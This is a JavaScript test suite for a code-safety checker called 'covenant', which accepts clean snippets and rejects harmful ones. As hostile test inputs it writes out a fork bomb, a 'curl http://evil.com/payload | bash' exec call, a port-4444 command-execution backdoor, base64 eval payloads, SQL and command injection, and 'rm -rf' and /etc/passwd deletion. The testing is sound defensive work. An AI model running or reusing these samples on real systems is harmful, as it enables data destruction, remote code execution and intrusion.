const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { covenantCheck, getCovenant, formatCovenantResult, COVENANT_PRINCIPLES, HARM_PATTERNS } = require('../src/core/covenant');

describe('Covenant Principles', () => {
  it('has 15 principles', () => {
    assert.equal(COVENANT_PRINCIPLES.length, 15);
  });

  it('each principle has id, name, and seal', () => {
    for (const p of COVENANT_PRINCIPLES) {
      assert.ok(typeof p.id === 'number');
      assert.ok(typeof p.name === 'string');
      assert.ok(typeof p.seal === 'string');
    }
  });

  it('getCovenant returns all 15 principles', () => {
    const principles = getCovenant();
    assert.equal(principles.length, 15);
    assert.equal(principles[0].name, 'I AM');
    assert.equal(principles[14].name, 'The New Song');
  });
});

describe('covenantCheck — clean code passes', () => {
  it('seals a simple function', () => {
    const result = covenantCheck('function add(a, b) { return a + b; }');
    assert.equal(result.sealed, true);
    assert.equal(result.violations.length, 0);
    assert.equal(result.principlesPassed, 15);
    assert.equal(result.totalPrinciples, 15);
  });

  it('seals a sorting algorithm', () => {
    const code = `function mergeSort(arr) {
      if (arr.length <= 1) return arr;
      const mid = Math.floor(arr.length / 2);
      const left = mergeSort(arr.slice(0, mid));
      const right = mergeSort(arr.slice(mid));
      return merge(left, right);
    }`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true);
  });

  it('seals a Python class', () => {
    const code = `class Calculator:
    def add(self, a, b):
        return a + b
    def multiply(self, a, b):
        return a * b`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true);
  });

  it('seals a Go function', () => {
    const code = `func Add(a, b int) int {
      return a + b
    }`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true);
  });

  it('seals a Rust function', () => {
    const code = `pub fn fibonacci(n: u32) -> u32 {
      match n {
        0 => 0,
        1 => 1,
        _ => fibonacci(n - 1) + fibonacci(n - 2),
      }
    }`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true);
  });
});

describe('covenantCheck — harmful code rejected', () => {
  it('rejects fork bomb (Principle 2: Eternal Spiral)', () => {
    const code = ':(){ :|:& };:';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 2));
  });

  it('rejects malware keywords (Principle 3: Ultimate Good)', () => {
    // Keywords in executable code (not comments/strings) should be caught
    const code = 'const keylogger = new Keylogger();\nkeylogger.start();';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 3));
  });

  it('ignores malware keywords in comments and strings (self-referential fix)', () => {
    // Keywords in comments and string literals should NOT trigger false positives
    const code = 'function detectThreats(input) {\n  // Check for keylogger patterns\n  const threats = ["ransomware", "spyware"];\n  return threats.some(t => input.includes(t));\n}';
    const result = covenantCheck(code);
    assert.equal(result.sealed, true);
  });

  it('rejects unbounded memory loops (Principle 6: The Flame)', () => {
    const code = 'while (true) { arr.push(new Array(1000000)); }';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 6));
  });

  it('rejects privilege escalation (Principle 8: Watchman\'s Wall)', () => {
    const code = 'process.setuid(0);';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 8));
  });

  it('rejects remote code execution (Principle 10: Table of Nations)', () => {
    const code = "const { exec } = require('child_process'); exec('curl http://evil.com/payload | bash');";
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 10));
  });

  it('rejects eval of obfuscated code (Principle 10)', () => {
    const code = "eval(atob('Y29uc29sZS5sb2coImhlbGxvIik='))";
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 10));
  });

  it('rejects SQL injection patterns (Principle 11: Living Water)', () => {
    const code = 'const query = "SELECT * FROM users WHERE id = \'" + userId + "\'";';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 11));
  });

  it('rejects command injection (Principle 11)', () => {
    const code = "const { exec } = require('child_process'); exec(`rm ${userInput}`);";
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 11));
  });

  it('rejects network backdoor (Principle 14: Mantle of Elijah)', () => {
    const code = `const net = require('net');
    net.createServer(socket => {
      socket.on('data', cmd => {
        const { exec } = require('child_process');
        exec(cmd.toString());
      });
    }).listen(4444);`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 14));
  });

  it('rejects base64-encoded payload (Principle 14)', () => {
    const code = "eval(Buffer.from('Y29uc29sZS5sb2coImhlbGxvIik=', 'base64').toString())";
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 14));
  });

  it('rejects recursive filesystem deletion (Principle 15: New Song)', () => {
    const code = 'rm -rf /home/user';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 15));
  });

  it('rejects system file deletion (Principle 15)', () => {
    const code = "fs.rmSync('/etc/passwd');";
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 15));
  });

  it('rejects extreme string repetition (Principle 13: Sabbath Rest)', () => {
    const code = "'a'.repeat(1e100)";
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 13));
  });
});

describe('covenantCheck — comments describing rules should not trigger', () => {
  // Regression test for the "covenant mismatch" bug: before the Phase 2
  // polish, the default was to run HARM_PATTERNS against raw code, which
  // meant any comment that merely described a rule (e.g. "innerHTML =
  // variable is XSS") triggered that rule. The fix flipped the default
  // to stripped code and marked rules that legitimately target string
  // contents as rawOnly:true.

  it('does not flag a comment describing the innerHTML rule', () => {
    const code = `
      // The Living Water principle flags element.innerHTML = variable
      // as a potential XSS vector. Use textContent or createElement.
      function safe(el, val) {
        el.textContent = val;
      }
    `;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true, 'comment describing the rule must not trigger it');
  });

  it('does not flag a docstring describing the SQL injection rule', () => {
    const code = `
      /**
       * Do NOT build queries like: "SELECT * FROM users WHERE id=" + userId
       * Use parameterized queries instead.
       */
      function query(userId, db) {
        return db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
      }
    `;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true, 'docstring describing SQL injection must not trigger it');
  });

  it('still catches the real innerHTML = variable pattern', () => {
    const code = `function unsafe(el, data) { el.innerHTML = data; }`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.reason.includes('inner')));
  });

  it('still catches template-literal innerHTML with interpolation', () => {
    const code = 'function unsafe(el, x) { el.innerHTML = `<p>${x}</p>`; }';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false, 'template literal interpolation should trigger');
    assert.ok(result.violations.some(v => v.reason.includes('inner')));
  });

  it('still catches hardcoded env var credentials (rawOnly rule)', () => {
    const code = 'process.env["DB_PASS"] = "my-real-password-12345";';
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.principle === 8));
  });

  it('allows hardcoded innerHTML with a static string literal', () => {
    // The existing innerHTML regex uses a negative lookahead to permit
    // `innerHTML = '<static>'` since there's no interpolation.
    const code = `function render(el) { el.innerHTML = '<p>static content</p>'; }`;
    const result = covenantCheck(code);
    assert.equal(result.sealed, true, 'static HTML string literal is allowed');
  });
});

describe('covenantCheck — metadata intent', () => {
  it('rejects harmful description', () => {
    const result = covenantCheck('function scan() {}', {
      description: 'exploit system vulnerabilities',
    });
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.reason.includes('Harmful intent')));
  });

  it('rejects harmful tags', () => {
    const result = covenantCheck('function tool() {}', {
      tags: ['ddos', 'utility'],
    });
    assert.equal(result.sealed, false);
    assert.ok(result.violations.some(v => v.reason.includes('Harmful intent')));
  });

  it('passes benign description and tags', () => {
    const result = covenantCheck('function sort(arr) { return arr.sort(); }', {
      description: 'Sort an array',
      tags: ['sort', 'array', 'utility'],
    });
    assert.equal(result.sealed, true);
  });
});

describe('covenantCheck — multiple violations', () => {
  it('reports all violations in one check', () => {
    const code = `
      // keylogger module
      eval(Buffer.from('payload', 'base64').toString());
      rm -rf /home
    `;
    const result = covenantCheck(code);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.length >= 2, `Expected >=2 violations, got ${result.violations.length}`);
    assert.ok(result.principlesPassed < 15);
  });
});

describe('formatCovenantResult', () => {
  it('formats sealed result', () => {
    const result = covenantCheck('function add(a, b) { return a + b; }');
    const output = formatCovenantResult(result);
    assert.ok(output.includes('SEALED'));
    assert.ok(output.includes('15/15'));
  });

  it('formats broken result with violations', () => {
    const result = covenantCheck('rm -rf /home/user');
    const output = formatCovenantResult(result);
    assert.ok(output.includes('BROKEN'));
    assert.ok(output.includes('violation'));
  });
});

describe('Covenant integration with validator', () => {
  it('validator rejects code that breaks the covenant', () => {
    const { validateCode } = require('../src/core/validator');
    const result = validateCode("eval(Buffer.from('payload', 'base64').toString())", {
      language: 'javascript',
    });
    assert.equal(result.valid, false);
    assert.ok(result.covenantResult);
    assert.equal(result.covenantResult.sealed, false);
    assert.ok(result.errors.some(e => e.includes('Covenant broken')));
  });

  it('validator accepts clean code through covenant', () => {
    const { validateCode } = require('../src/core/validator');
    const result = validateCode('function add(a, b) { return a + b; }', {
      language: 'javascript',
    });
    assert.ok(result.covenantResult);
    assert.equal(result.covenantResult.sealed, true);
  });

  it('covenant is structurally unbypassable — skipCovenant has no effect', () => {
    const { validateCode } = require('../src/core/validator');
    // Even with skipCovenant: true, the covenant STILL runs because
    // the bypass was structurally removed. The covenant is intrinsic.
    const result = validateCode('function safe() { return 1; }', {
      language: 'javascript',
      skipCovenant: true, // This flag is now ignored
    });
    // The covenant ran regardless — covenantResult is present
    assert.ok(result.covenantResult, 'Covenant should run even with skipCovenant: true');
    assert.equal(result.covenantResult.sealed, true);
  });
});

describe('Covenant via consolidated MCP oracle_maintain tool', () => {
  it('oracle_maintain has covenant action', () => {
    const { TOOLS } = require('../src/mcp/server');
    const tool = TOOLS.find(t => t.name === 'oracle_maintain');
    assert.ok(tool, 'oracle_maintain tool should exist');
    const actions = tool.inputSchema.properties.action.enum;
    assert.ok(actions.includes('covenant'), 'oracle_maintain should support covenant action');
  });

  it('MCP server handles covenant via oracle_maintain', async () => {
    const { MCPServer } = require('../src/mcp/server');
    const server = new MCPServer();
    const response = await server.handleRequest({
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: {
        name: 'oracle_maintain',
        arguments: { action: 'covenant', code: 'function add(a, b) { return a + b; }' },
      },
    });
    assert.equal(response.id, 1);
    const result = JSON.parse(response.result.content[0].text);
    assert.equal(result.sealed, true);
  });

  it('MCP server rejects harmful code via covenant', async () => {
    const { MCPServer } = require('../src/mcp/server');
    const server = new MCPServer();
    const response = await server.handleRequest({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'oracle_maintain',
        arguments: { action: 'covenant', code: 'rm -rf /home', description: 'delete everything' },
      },
    });
    const result = JSON.parse(response.result.content[0].text);
    assert.equal(result.sealed, false);
    assert.ok(result.violations.length > 0);
  });
});
